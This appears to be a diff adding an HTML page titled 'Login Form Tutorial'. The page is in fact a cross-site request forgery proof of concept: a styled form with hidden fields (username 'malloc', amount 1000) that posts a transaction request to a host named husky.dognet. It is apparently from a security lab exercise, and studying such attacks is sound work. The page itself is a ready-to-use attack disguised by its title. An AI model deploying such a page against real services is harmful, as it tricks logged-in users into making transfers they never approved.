@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta charset="utf-8">
+		<title>Login Form Tutorial</title>
+		<style>
+        .csrf {
+			width: 300px;
+			margin: 0 auto;
+			font-family: Tahoma, Geneva, sans-serif;
+		}
+        .csrf input[type="password"],
+		.csrf input[type="text"] {
+			width: 100%;
+			padding: 15px;
+			border: 1px solid #dddddd;
+			margin-bottom: 15px;
+			box-sizing:border-box;
+		}
+		.csrf input[type="submit"] {
+			width: 100%;
+			padding: 15px;
+			background-color: #535b63;
+			border: 0;
+            width: 50%;
+			box-sizing: border-box;
+			cursor: pointer;
+			font-weight: bold;
+			color: #ffffff;
+		}
+        </style>
+        </head>
+        <body>
+            <center>
+                <br>
+                <br>
+            <div class="csrf">
+                <form action="http://husky.dognet:8008/transactiongo" method="POST">
+                    <input name="username" value="malloc" type="hidden">
+                    <input name="amount" type="hidden" value="1000">
+                    <input type="submit">
+                </form>
+            </div>
+        </center>
+    </body>
+</html>
